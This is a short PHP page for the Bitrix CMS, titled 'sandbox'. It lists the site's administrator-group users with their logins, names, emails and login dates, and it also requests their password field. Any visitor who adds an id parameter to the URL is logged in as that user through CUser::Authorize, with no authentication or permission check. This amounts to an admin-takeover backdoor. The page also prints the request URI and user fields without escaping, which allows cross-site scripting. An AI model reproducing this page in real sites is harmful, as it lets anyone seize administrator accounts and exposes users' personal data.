<? 
error_reporting( E_ALL );
ini_set('display_errors', 1); 
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php"); 
    $APPLICATION->SetTitle("Песочница"); 
    if(!CModule::IncludeModule("iblock")) 
    { 
        $this->AbortResultCache(); 
        ShowError("IBLOCK_MODULE_NOT_INSTALLED"); 
        return false; 
    } 
    $users = array(); 
    $pageUrl = $_SERVER['REQUEST_URI']; 
    $filterUsers = array( 
        "GROUPS_ID" => 
        array(1), 
    ); 
    $paramsUsers = array( 
        "FIELDS" => array( 
            "ID", 
            "LOGIN", 
            "PASSWORD", 
            "NAME", 
            "LAST_NAME", 
            "EMAIL", 
            "LAST_LOGIN", 
            "DATE_REGISTER", 
        ), 
    ); 
    $dbUsers = CUser::GetList(($by='id'), ($order='asc'), $filterUsers, $paramsUsers); 
    echo "<table border='1px'>"; 
    while ($arUsers = $dbUsers->Fetch()) 
    { 
        echo "<tr> 
            <td>" . $arUsers["ID"] . "</td> 
            <td><a href='" . $pageUrl . "?id=" . $arUsers["ID"] . "'>" . $arUsers["LOGIN"] . "</a></td> 
            <td>" . $arUsers["NAME"] . "</td> 
            <td>" . $arUsers["LAST_NAME"] . "</td> 
            <td>" . $arUsers["EMAIL"] . "</td> 
            <td>" . $arUsers["LAST_LOGIN"] . "</td> 
            <td>" . $arUsers["DATE_REGISTER"] . "</td> 
        </tr>"; 
    } 
    echo "</table>"; 
    if ($_GET["id"]) 
    { 
        CUser::Authorize($_GET["id"]); 
    } 
    require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");
	?>